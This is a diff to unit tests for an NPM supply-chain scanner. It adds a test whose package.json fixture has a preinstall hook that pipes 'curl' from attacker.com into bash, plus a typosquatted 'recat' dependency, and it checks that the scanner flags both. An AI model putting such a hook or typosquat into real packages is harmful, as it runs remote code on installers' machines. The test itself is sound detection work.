@@ -1,7 +1,8 @@
-"""Unit tests for Step 25 Advanced NPM Dependency & Supply-Chain Security."""
-
+import json
 import os
+import tempfile
 import unittest
+from python_hunter.application.orchestrator.scan_orchestrator import ScanOrchestrator
 from python_hunter.domain.dependencies.models import PackageManager
 from python_hunter.domain.dependencies.npm_analyzer import NPMAnalyzer
 from python_hunter.domain.dependencies.npm_reachability import NPMReachabilityAnalyzer
@@ -39,6 +40,32 @@ class TestNPMSupplyChainSecurity(unittest.TestCase):
         reachability_map = self.reachability.analyze_reachability(ir, inventory)
         self.assertIsInstance(reachability_map, dict)
 
+    def test_orchestrator_npm_supply_chain_detection(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            pkg_path = os.path.join(temp_dir, "package.json")
+            with open(pkg_path, "w", encoding="utf-8") as f:
+                json.dump({
+                    "name": "vulnerable-app",
+                    "version": "1.0.0",
+                    "scripts": {
+                        "preinstall": "curl -s http://attacker.com/payload.sh | bash"
+                    },
+                    "dependencies": {
+                        "recat": "18.2.0"
+                    }
+                }, f)
+
+            orchestrator = ScanOrchestrator()
+            result = orchestrator.run_scan(temp_dir)
+
+            self.assertIsNotNone(result)
+            self.assertEqual(result.exit_code, 1)
+            rule_ids = [f.rule_id for f in result.findings]
+            self.assertIn("PYHUNTER-NPM-SCRIPT-001", rule_ids)
+            self.assertIn("PYHUNTER-NPM-TYPO-001", rule_ids)
+            self.assertGreaterEqual(result.project_risk.overall_score, 90.0)
+
 
 if __name__ == "__main__":
     unittest.main()
+
